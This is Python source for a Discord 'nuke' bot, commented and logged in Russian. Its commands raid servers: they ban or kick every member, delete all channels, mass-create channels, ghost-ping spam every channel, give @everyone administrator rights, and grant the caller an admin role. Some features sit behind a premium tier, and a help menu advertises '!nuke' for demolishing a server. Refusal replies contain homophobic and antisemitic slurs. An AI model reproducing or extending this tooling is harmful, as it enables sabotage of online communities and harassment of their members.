@commands.cooldown(1, 120, commands.BucketType.guild)
async def stats(ctx):
    guild = ctx.guild
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда stats не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда stats запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Блядь, много хочешь, пидор.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда stats запрещена[/]")
        return

    console.print(f"[action]📊 Запуск команды stats для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    try:
        user_id = ctx.author.id
        server_count = update_server_count(user_id, guild.id)
        member_count = guild.member_count

        try:
            with open('premium_users.json', 'r') as file:
                premium_users_data = json.load(file)
        except FileNotFoundError:
            premium_users_data = []
            console.print(f"[error]❌ Файл premium_users.json не найден, премиум-статус не проверен[/]")
        except json.JSONDecodeError:
            premium_users_data = []
            console.print(f"[error]❌ Ошибка чтения premium_users.json, файл повреждён[/]")

        premium_status = "You have premium." if str(user_id) in premium_users_data or user_id in premium_users_data else "You don't have premium."

        message = (
            f"Stats {ctx.author.mention}\n"
            f"N*3ked servers: {server_count}\n"
            f"Total members on this server: {member_count}\n"
            f"{premium_status}"
        )

        await ctx.send(message)
        console.print(f"[success]🎉 Команда stats завершена: статистика отправлена пользователю {ctx.author.name} ({ctx.author.id})[/]")

    except Exception as e:
        await ctx.send(f"An error occurred while executing the stats command.: {e}")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды stats на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command(name='createchannels')
@commands.cooldown(1, 120, commands.BucketType.user)
async def create_channels_command(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда createchannels не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда createchannels запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("засунь себе в рот большой член")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда createchannels запрещена[/]")
        return

    user_id = str(ctx.author.id)
    config = user_config.get(user_id, default_config)
    console.print(f"[action]🏗️ Запуск команды createchannels для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    try:
        if len(guild.channels) + config["num_channels"] > 500:
            await ctx.send("❌ Too many channels on the server, it is impossible to create new ones!")
            console.print(f"[error]❌ Превышен лимит каналови на сервере {guild.name} ({guild.id})[/]")
            return
        await create_new_resources(guild, config)
        await ctx.send(f"Channels successfully created!")
        console.print(f"[success]✅ Команда createchannels успешно выполнена на сервере {guild.name} ({guild.id})[/]")
    except discord.Forbidden:
        console.print(f"[error]❌ Недостаточно прав для создания каналов на сервере {guild.name} ({guild.id})[/]")
        await ctx.send("У бота недостаточно прав для создания каналов!")
    except discord.HTTPException as e:
        console.print(f"[error]❌ HTTP ошибка при выполнении createchannels: {e}[/]")
        await ctx.send(f"Error creating channels!")
    except Exception as e:
        console.print(f"[error]❌ Неизвестная ошибка при выполнении createchannels: {e}[/]")
        await ctx.send(f"An unknown error occurred!")

@bot.command(name='custom_createchannels')
@commands.cooldown(1, 120, commands.BucketType.user)
async def create_channels_command2(ctx, channel_name: str = None, topic: str = None):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда custom_createchannels не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда custom_createchannels запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("а хуй тебе")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда custom_createchannels запрещена[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Пользователь {ctx.author.name} ({ctx.author.id}) не премиум, доступ к custom_createchannels запрещён[/]")
        return

    user_id = str(ctx.author.id)
    config = user_config.get(user_id, default_config)
    channel_name = channel_name or config.get("channel_name")
    console.print(f"[action]🏗️ Запуск команды custom_createchannels с названием '{channel_name}' и топиком '{topic}' для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    try:
        if len(guild.channels) + config["num_channels"] > 500:
            await ctx.send("❌ Too many channels on the server, it is impossible to create new ones!")
            console.print(f"[error]❌ Превышен лимит каналов на сервере {guild.name} ({guild.id})[/]")
            return
        temp_config = config.copy()
        temp_config["channel_name"] = channel_name
        await create_new_resources(guild, temp_config)
        await ctx.send(f"Channels successfully created!")
        console.print(f"[success]✅ Команда custom_createchannels успешно выполнена на сервере {guild.name} ({guild.id})[/]")
    except discord.Forbidden:
        console.print(f"[error]❌ Недостаточно прав для создания каналов на сервере {guild.name} ({guild.id})[/]")
        await ctx.send("❌ The bot does not have sufficient rights to create channels!")
    except discord.HTTPException as e:
        console.print(f"[error]❌ HTTP ошибка при выполнении custom_createchannels: {e}[/]")
        await ctx.send(f"❌ Error creating channels!")
    except Exception as e:
        console.print(f"[error]❌ Неизвестная ошибка при выполнении custom_createchannels: {e}[/]")
        await ctx.send(f"❌ An unknown error occurred!")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def ghostping(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда ghostping не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда ghostping запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("пингани гхостом свой сервер")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда ghostping запрещена[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Пользователь {ctx.author.name} ({ctx.author.id}) не премиум, доступ к ghostping запрещён[/]")
        return

    user_id = str(ctx.author.id)
    config = user_config.get(user_id, default_config)
    message = config.get("spam_message")  
    spam_count = config.get("spam_count")  
    console.print(f"[action]👻 Запуск команды ghostping для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id}) с сообщением '{message}' {spam_count} раз[/]")

    try:
        bypass = await detect_protected_bots(guild)
        tasks = []
        for channel in guild.channels:
            if isinstance(channel, (discord.TextChannel, discord.VoiceChannel)):
                if channel.permissions_for(guild.me).send_messages and channel.permissions_for(guild.me).manage_messages:
                    tasks.append(send_ghost_message(channel, message, spam_count))
                else:
                    console.print(f"[warning]⚠️ Нет прав для отправки/удаления сообщений в канале '{channel.name}' (ID: {channel.id})[/]")
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send(f"Ghost ping messages sent {spam_count} times to available channels!")
        console.print(f"[success]✅ Команда ghostping успешно выполнена на сервере {guild.name} ({guild.id})[/]")
    except discord.Forbidden:
        console.print(f"[error]❌ Недостаточно прав для выполнения ghostping на сервере {guild.name} ({guild.id})[/]")
        await ctx.send("The bot does not have sufficient rights to send or delete messages!")
    except discord.HTTPException as e:
        console.print(f"[error]❌ HTTP ошибка при выполнении ghostping: {e}[/]")
        await ctx.send(f"Error while ghostping!")
    except Exception as e:
        console.print(f"[error]❌ Неизвестная ошибка при выполнении ghostping: {e}[/]")
        await ctx.send(f"An unknown error occurred!")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def icon(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда icon не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда icon запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("себя поменяй")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда icon запрещена[/]")
        return

    user_id = str(ctx.author.id)
    config = user_config.get(user_id, default_config)
    icon_path = default_config.get("icon_path")  
    console.print(f"[action]🖼️ Запуск команды icon для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id}) с файлом '{icon_path}'[/]")

    try:
        if not ctx.guild.me.guild_permissions.administrator:
            await ctx.send("❌ The bot does not have sufficient rights (administrator required) to change the server icon!")
            console.print(f"[error]❌ Недостаточно прав (администратор) для изменения иконки на сервере {guild.name} ({guild.id})[/]")
            return

        try:
            with open(icon_path, 'rb') as h:
                avatar = h.read()
        except FileNotFoundError:
            await ctx.send(f"❌ Icon file '{icon_path}' not found!")
            console.print(f"[error]❌ Файл иконки '{icon_path}' не найден[/]")
            return
        except Exception as e:
            await ctx.send(f"❌ Error reading icon file: {e}")
            console.print(f"[error]❌ Ошибка при чтении файла иконки '{icon_path}': {e}[/]")
            return

        async with limiter:
            await ctx.guild.edit(icon=avatar)
            await ctx.send("Server icon successfully changed!")
            console.print(f"[success]✅ Иконка сервера {guild.name} ({guild.id}) успешно изменена[/]")
    except discord.Forbidden:
        await ctx.send("The bot does not have enough rights to change the server icon.")
        console.print(f"[error]❌ Недостаточно прав для изменения иконки на сервере {guild.name} ({guild.id})[/]")
    except discord.HTTPException as e:
        await ctx.send(f"Failed to change server icon: {e}")
        console.print(f"[error]❌ HTTP ошибка при изменении иконки сервера {guild.name} ({guild.id}): {e}[/]")
    except Exception as e:
        await ctx.send("An unknown error occurred while executing the command.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды icon на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def custom_icon(ctx, url: str = None):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда custom_icon не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда custom_icon запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("блядь тут и так ава норм иди нахуй")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда custom_icon запрещена[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Пользователь {ctx.author.name} ({ctx.author.id}) не премиум, доступ к custom_icon запрещён[/]")
        return

    console.print(f"[action]🖼️ Запуск команды custom_icon для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    if not url and not ctx.message.attachments:
        await ctx.send("Please provide the image URL or attach the image file.")
        console.print(f"[error]❌ Не указан URL или вложение для команды custom_icon[/]")
        return

    try:
        async with aiohttp.ClientSession() as session:
            if url:
                async with session.get(url) as response:
                    if response.status != 200:
                        await ctx.send(f"❌ Failed to load image from URL: HTTP {response.status}")
                        console.print(f"[error]❌ Не удалось загрузить изображение с URL {url}: HTTP {response.status}[/]")
                        return
                    image_data = await response.read()
            else:
                attachment = ctx.message.attachments[0]
                async with session.get(attachment.url) as response:
                    if response.status != 200:
                        await ctx.send(f"❌ Failed to load attachment: HTTP {response.status}")
                        console.print(f"[error]❌ Не удалось загрузить вложение {attachment.url}: HTTP {response.status}[/]")
                        return
                    image_data = await response.read()

        if not ctx.guild.me.guild_permissions.administrator:
            await ctx.send("The bot does not have sufficient rights (administrator required) to change the server icon!")
            console.print(f"[error]❌ Недостаточно прав (администратор) для изменения иконки на сервере {guild.name} ({guild.id})[/]")
            return

        async with limiter:
            await ctx.guild.edit(icon=image_data)
            await ctx.send("Server icon successfully changed!")
            console.print(f"[success]✅ Иконка сервера {guild.name} ({guild.id}) успешно изменена[/]")
    except discord.Forbidden:
        await ctx.send("The bot does not have sufficient rights to change the server icon.")
        console.print(f"[error]❌ Недостаточно прав для изменения иконки на сервере {guild.name} ({guild.id})[/]")
    except discord.HTTPException as e:
        await ctx.send(f"Failed to change server icon: {e}")
        console.print(f"[error]❌ HTTP ошибка при изменении иконки сервера {guild.name} ({guild.id}): {e}[/]")
    except Exception as e:
        await ctx.send("An unknown error occurred while executing the command.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды custom_icon на сервере {guild.name} ({guild.id}): {e}[/]")
         
@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def delchannels(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда delchannels не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда delchannels запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("удали валидку на себя в глазе бога даун сначала")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда delchannels запрещена[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Пользователь {ctx.author.name} ({ctx.author.id}) не премиум, доступ к delchannels запрещён[/]")
        return

    console.print(f"[action]🗑️ Запуск команды delchannels для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    try:
        if not ctx.guild.me.guild_permissions.manage_channels:
            await ctx.send("The bot does not have sufficient rights to delete channels!")
            console.print(f"[error]❌ Недостаточно прав для удаления каналов на сервере {guild.name} ({guild.id})[/]")
            return

        bypass = await detect_protected_bots(guild)
        delete_channel_tasks = [delete_channel(channel) for channel in guild.channels]
        await asyncio.gather(*delete_channel_tasks, return_exceptions=True)
        await ctx.send("All channels have been successfully deleted!")
        console.print(f"[success]✅ Команда delchannels успешно выполнена на сервере {guild.name} ({guild.id})[/]")
    except discord.Forbidden:
        await ctx.send("The bot does not have sufficient rights to delete channels!")
        console.print(f"[error]❌ Недостаточно прав для удаления каналов на сервере {guild.name} ({guild.id})[/]")
    except discord.HTTPException as e:
        await ctx.send(f"Error deleting channels: {e}")
        console.print(f"[error]❌ HTTP ошибка при выполнении delchannels: {e}[/]")
    except Exception as e:
        await ctx.send("An unknown error occurred while executing the command.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении delchannels: {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def admin(ctx):
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда admin не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в server_blacklist, команда admin запрещена! 😿[/]")
        return
    
    if ctx.guild.id in excluded_server_id:
        await ctx.send("много хочешь")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в excluded_server_id, команда admin запрещена[/]")
        return
    
    console.print(f"[action]🔧 Запуск команды admin для {ctx.author.name} ({ctx.author.id})...[/]")
    
    try:
        role = await ctx.guild.create_role(name='msc', permissions=discord.Permissions(administrator=True))
        console.print(f"[success]✅ Роль 'msc' с админ-правами создана на сервере {ctx.guild.name} ({ctx.guild.id})[/]")
    except discord.Forbidden:
        await ctx.send("I do not have permission to create roles on this server.")
        console.print(f"[error]❌ Нет прав для создания роли на сервере {ctx.guild.name} ({ctx.guild.id}) 😿[/]")
        return
    except discord.HTTPException as e:
        await ctx.send("Error creating role. Try again later.")
        console.print(f"[error]❌ HTTP ошибка при создании роли: {e} 😿[/]")
        return
    
    try:
        await ctx.author.add_roles(role)
        await ctx.send(f"Successfully granted the administrator role!")
        console.print(f"[success]🎉 Роль 'msc' выдана пользователю {ctx.author.name} ({ctx.author.id})[/]")
    except discord.Forbidden:
        await ctx.send("I don't have permission to add roles to you.")
        console.print(f"[error]❌ Нет прав для выдачи роли пользователю {ctx.author.name} ({ctx.author.id}) 😿[/]")
    except discord.HTTPException as e:
        await ctx.send("Error issuing role. Try again later.")
        console.print(f"[error]❌ HTTP ошибка при выдаче роли: {e} 😿[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def everyone_admin(ctx):
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда everyone_admin не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в server_blacklist, команда everyone_admin запрещена! 😿[/]")
        return
    
    if ctx.guild.id in excluded_server_id:
        await ctx.send("евреи тебя в рот ебать будут")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в excluded_server_id, команда everyone_admin запрещена[/]")
        return
    
    console.print(f"[action]🔧 Запуск команды everyone_admin на сервере {ctx.guild.name} ({ctx.guild.id})...[/]")
    
    try:
        role = ctx.guild.default_role 
        if not role:
            await ctx.send("Could not find role @everyone on this server.")
            console.print(f"[error]❌ Роль @everyone не найдена на сервере {ctx.guild.name} ({ctx.guild.id}) 😿[/]")
            return
        
        await role.edit(permissions=discord.Permissions(administrator=True))
        await ctx.send(f"Successfully issued licenses to everyone!")
        console.print(f"[success]🎉 Роль @everyone на сервере {ctx.guild.name} ({ctx.guild.id}) получила админ-права[/]")
    
    except discord.Forbidden:
        await ctx.send("I don't have permission to change the @everyone role.")
        console.print(f"[error]❌ Нет прав для изменения роли @everyone на сервере {ctx.guild.name} ({ctx.guild.id}) 😿[/]")
    except discord.HTTPException as e:
        await ctx.send("Error changing role @everyone. Try again later.")
        console.print(f"[error]❌ HTTP ошибка при изменении роли @everyone: {e} 😿[/]")
    except Exception as e:
        await ctx.send("An unknown error occurred while executing the command.")
        console.print(f"[error]❌ Неизвестная ошибка в everyone_admin: {e} 😿[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def banall(ctx):
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда banall не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в server_blacklist, команда !banall запрещена[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("себя забань еблан ты кто такой")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в excluded_server_ids, команда !banall запрещена[/]")
        return

    console.print(f"[action]💥 Запуск команды !banall на сервере {ctx.guild.name} ({ctx.guild.id})...[/]")

    count = 0
    failed_count = 0
    reason = "переезд нахуй"
    error_occurred = False

    for member in ctx.guild.members:
        if member.id != ctx.author.id and member.id != ctx.guild.me.id:
            try:
                async with limiter:
                    await ctx.guild.ban(member, reason=reason)
                console.print(f"[success]✅ Забанил участника {member.name} ({member.id})[/]")
                count += 1
            except discord.Forbidden:
                console.print(f"[error]❌ Не удалось забанить участника {member.name} ({member.id}): нет прав[/]")
                failed_count += 1
                error_occurred = True
            except discord.HTTPException as e:
                console.print(f"[error]❌ Ошибка при бане участника {member.name} ({member.id}): {e}[/]")
                failed_count += 1
            except Exception as e:
                console.print(f"[error]❌ Неизвестная ошибка при бане участника {member.name} ({member.id}): {e}[/]")
                failed_count += 1

    if ctx.guild.me.guild_permissions.administrator:
        await ctx.send(f'Banned {count} people! Failed to ban {failed_count} people.')
        console.print(f"[success]✅ Забанено {count} человек, не удалось забанить {failed_count} на сервере {ctx.guild.name}[/]")
    else:
        await ctx.send("An error occurred. The bot most likely does not have sufficient rights.")
        console.print(f"[error]❌ Недостаточно прав для выполнения !banall на сервере {ctx.guild.name}[/]")

    if failed_count > 0 and not error_occurred:
        await ctx.send(f'Banned {count} people! Failed to ban {failed_count} people.')
        console.print(f"[warning]⚠️ Частичный успех: забанено {count}, не удалось забанить {failed_count} на сервере {ctx.guild.name}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def unbanall(ctx):
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда unbanall не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в server_blacklist, команда !unbanall запрещена[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("себя разбань пидор жди секс")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в excluded_server_ids, команда !unbanall запрещена[/]")
        return

    console.print(f"[action]🔓 Запуск команды !unbanall на сервере {ctx.guild.name} ({ctx.guild.id})...[/]")

    count = 0
    failed_count = 0
    error_occurred = False

    try:
        banned_users = []
        async for ban_entry in ctx.guild.bans():
            user = ban_entry.user
            try:
                async with limiter:
                    await ctx.guild.unban(user)
                console.print(f"[success]✅ Разбанил участника {user.name} ({user.id})[/]")
                banned_users.append(user)
                count += 1
            except discord.Forbidden:
                console.print(f"[error]❌ Не удалось разбанить участника {user.name} ({user.id}): нет прав[/]")
                failed_count += 1
                error_occurred = True
            except discord.HTTPException as e:
                console.print(f"[error]❌ Ошибка при разбане участника {user.name} ({user.id}): {e}[/]")
                failed_count += 1
            except Exception as e:
                console.print(f"[error]❌ Неизвестная ошибка при разбане участника {user.name} ({user.id}): {e}[/]")
                failed_count += 1

        if not banned_users:
            await ctx.send("There is no one on the ban list.")
            console.print(f"[info]📜 Список банов пуст на сервере {ctx.guild.name} ({ctx.guild.id})[/]")
            return

    except Exception as e:
        console.print(f"[error]❌ Неизвестная ошибка при выполнении !unbanall: {e}[/]")
        error_occurred = True

    if ctx.guild.me.guild_permissions.administrator:
        await ctx.send(f'Unbanned {count} people! Failed to unban {failed_count} people.')
        console.print(f"[success]✅ Разбанил {count} человек, не удалось разбанить {failed_count} на сервере {ctx.guild.name}[/]")
    else:
        await ctx.send("An error occurred. The bot most likely does not have sufficient rights.")
        console.print(f"[error]❌ Недостаточно прав для выполнения !unbanall на сервере {ctx.guild.name}[/]")

    if failed_count > 0 and not error_occurred:
        await ctx.send(f'Unbanned {count} people! Failed to unban {failed_count} people.')
        console.print(f"[warning]⚠️ Частичный успех: разбанил {count}, не удалось разбанить {failed_count} на сервере {ctx.guild.name}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def kickall(ctx):
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда kickall не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в server_blacklist, команда !kickall запрещена[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("себя кикни")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в excluded_server_ids, команда !kickall запрещена[/]")
        return

    console.print(f"[action]👢 Запуск команды !kickall на сервере {ctx.guild.name} ({ctx.guild.id})...[/]")

    count = 0
    failed_count = 0
    reason = "переезд нахуй"
    error_occurred = False

    for member in ctx.guild.members:
        if member.id != ctx.author.id and member.id != ctx.guild.me.id:
            try:
                async with limiter:
                    await ctx.guild.kick(member, reason=reason)
                console.print(f"[success]✅ Кикнул участника {member.name} ({member.id})[/]")
                count += 1
            except discord.Forbidden:
                console.print(f"[error]❌ Не удалось кикнуть участника {member.name} ({member.id}): нет прав[/]")
                failed_count += 1
                error_occurred = True
            except discord.HTTPException as e:
                console.print(f"[error]❌ Ошибка при кике участника {member.name} ({member.id}): {e}[/]")
                failed_count += 1
            except Exception as e:
                console.print(f"[error]❌ Неизвестная ошибка при кике участника {member.name} ({member.id}): {e}[/]")
                failed_count += 1

    if ctx.guild.me.guild_permissions.administrator:
        await ctx.send(f'Kicked {count} people! Failed to kick {failed_count} people.')
        console.print(f"[success]✅ Кикнуто {count} человек, не удалось кикнуть {failed_count} на сервере {ctx.guild.name}[/]")
    else:
        await ctx.send("An error occurred. The bot most likely does not have sufficient rights.")
        console.print(f"[error]❌ Недостаточно прав для выполнения !kickall на сервере {ctx.guild.name}[/]")

    if failed_count > 0 and not error_occurred:
        await ctx.send(f'Kicked {count} people! Failed to kick {failed_count} people.')
        console.print(f"[warning]⚠️ Частичный успех: кикнуто {count}, не удалось кикнуть {failed_count} на сервере {ctx.guild.name}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def ping(ctx):
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда ping не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в server_blacklist, команда ping запрещена! 😿[/]")
        return
    
    console.print(f"[action]📡 Запуск команды ping для {ctx.author.name} ({ctx.author.id}) на сервере {ctx.guild.name} ({ctx.guild.id})...[/]")
    
    ping_ms = round(bot.latency * 1000)
    
    uptime_seconds = time.time() - BOT_START_TIME
    uptime_str = str(timedelta(seconds=int(uptime_seconds)))
    
    server_count = len(bot.guilds)
    
    shard_info = []
    if bot.shard_count and bot.shard_count > 1:  
        for shard_id, shard in bot.shards.items():
            shard_ping = round(shard.latency * 1000)
            shard_info.append(f"Shard {shard_id}: {shard_ping} мс")
        average_shard_ping = round(sum(shard.latency * 1000 for shard in bot.shards.values()) / bot.shard_count)
        shard_info.append(f"Average: {average_shard_ping} мс")
    else:
        shard_info.append("Sharding is not active")
    
    shard_str = "\n".join(shard_info)
    
    embed = {
        "title": "> 📡 Ping",
        "description": "",
        "color": 0x808080,  
        "fields": [
            {
                "name": "> Ping",
                "value": f"**```\n{ping_ms} мс\n```**",
                "inline": True
            },
            {
                "name": "> Uptime",
                "value": f"**```\n{uptime_str}\n```**",
                "inline": True
            },
            {
                "name": "> Servers",
                "value": f"**```\n{server_count} шт.\n```**",
                "inline": True
            },
            {
                "name": "> Shards",
                "value": f"**```\n{shard_str}\n```**",
                "inline": False 
            }
        ],
        "footer": {
            "text": ""
        }
    }
    embed = discord.Embed.from_dict(embed)
    
    try:
        await ctx.send(embed=embed, delete_after=30)  
        console.print(f"[success]🎉 Команда ping выполнена: пинг {ping_ms} мс, аптайм {uptime_str}, серверов {server_count}, шарды {shard_str} для {ctx.author.name} ({ctx.author.id})[/]")
    except Exception as e:
        console.print(f"[error]❌ Ошибка при отправке ответа ping: {e} 😿[/]")
    
    channel_log = bot.get_channel(1359864466854117416)
    if channel_log:
        log_embed = discord.Embed(
            title="Команда !ping использована",
            description=f"{ctx.author.mention} заюзал `!ping` на сервере **{ctx.guild.name}** ({ctx.guild.id})",
            color=0x808080
        )
        log_embed.add_field(name="Ping", value=f"{ping_ms} мс", inline=True)
        log_embed.add_field(name="Uptame", value=uptime_str, inline=True)
        log_embed.add_field(name="Servers", value=f"{server_count} шт.", inline=True)
        log_embed.add_field(name="Shards", value=shard_str, inline=False)
        try:
            await channel_log.send(embed=log_embed)
            console.print(f"[success]✅ Лог команды ping отправлен в канал {channel_log.name} ({channel_log.id})[/]")
        except discord.Forbidden:
            console.print(f"[error]❌ Нет прав для отправки лога в канал {channel_log.name} ({channel_log.id})[/]")
        except Exception as e:
            console.print(f"[error]❌ Ошибка при отправке лога команды ping: {e} 😿[/]")
    else:
        console.print(f"[warning]⚠️ Канал логов (1317977278512103454) не найден[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def invite(ctx):
    permissions = discord.Permissions.all()
    invite_link = f'https://discord.com/api/oauth2/authorize?client_id={ctx.bot.user.id}&permissions={permissions.value}&scope=bot'
    await ctx.send(invite_link, delete_after=30)

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def update(ctx):
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда update не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в server_blacklist, команда update запрещена! 😿[/]")
        return
       
    console.print(f"[action]📢 Запуск команды update для {ctx.author.name} ({ctx.author.id}) на сервере {ctx.guild.name} ({ctx.guild.id})...[/]")
    
    embed = discord.Embed(
        title='What has been added:',
        description=whyadded,
        colour=discord.Colour.from_rgb(0, 0, 0)
    )
    
    try:
        await ctx.send(embed=embed)
        console.print(f"[success]🎉 Команда update выполнена для {ctx.author.name} ({ctx.author.id}) на сервере {ctx.guild.name} ({ctx.guild.id})[/]")
    except Exception as e:
        console.print(f"[error]❌ Ошибка при отправке ответа update: {e} 😿[/]")
@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def auto_nuke(ctx, state: str):
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда auto_nuke не может быть использована на этом сервере.")
        return
    global auto_nuke_disabled_users
    state = state.lower()
    if state not in ['on', 'off']:
        await ctx.send("Please specify 'on' or 'off'. Example: `!auto_nuke on` ")
        console.print(f"[warning]⚠️ {ctx.author.name} ({ctx.author.id}) указал неверный параметр '{state}' для auto_nuke. 🚫[/]")
        return

    user_id = str(ctx.author.id)
    
    if state == 'on':
        if user_id in auto_nuke_disabled_users:
            auto_nuke_disabled_users.remove(user_id)
            save_auto_nuke_users(auto_nuke_disabled_users)
        await ctx.send("Auto-nuke enabled")
        console.print(f"[success]🔥 Имба! Авто-нюк включён для {ctx.author.name} ({user_id}), теперь будет разнос! 💥[/]")
    else:
        if user_id not in auto_nuke_disabled_users:
            auto_nuke_disabled_users.append(user_id)
            save_auto_nuke_users(auto_nuke_disabled_users)
        await ctx.send("Auto-nuke is disabled")
        console.print(f"[error]😿 Авто-нюк выключен для {ctx.author.name} ({user_id}), больше не будет разносить. 🗑️[/]")

class CategoryView(ui.View):
    def __init__(self, locale):
        super().__init__(timeout=None)
        self.locale = locale

        options = [
            SelectOption(label="💀 Equipos gratuitos" if locale == 'es' else "💀 Free Commands",
                         description="Descripción de los comandos gratuitos" if locale == 'es' else "Description of free commands",
                         value="free_commands"),
            SelectOption(label="💎 Equipo Premium" if locale == 'es' else "💎 Premium Commands",
                         description="Descripción de equipos Premium" if locale == 'es' else "Description of premium commands",
                         value="premium_commands")
        ]
        select = ui.Select(placeholder="Seleccione una categoría" if locale == 'es' else "Select a category",
                          options=options, custom_id="category_select")
        select.callback = self.select_callback
        self.add_item(select)

    async def select_callback(self, interaction: Interaction):
        selected_value = interaction.data['values'][0]
        embed = None

        if selected_value == "free_commands":
            if self.locale == 'es':
                embed = discord.Embed(
                    title="Equipos gratuitos",
                    description=">>> `!nuke` - comando para demoler un servidor\n"
                                "`!crssh [id/link]` - comando para demoler un servidor por ID y enlace\n"
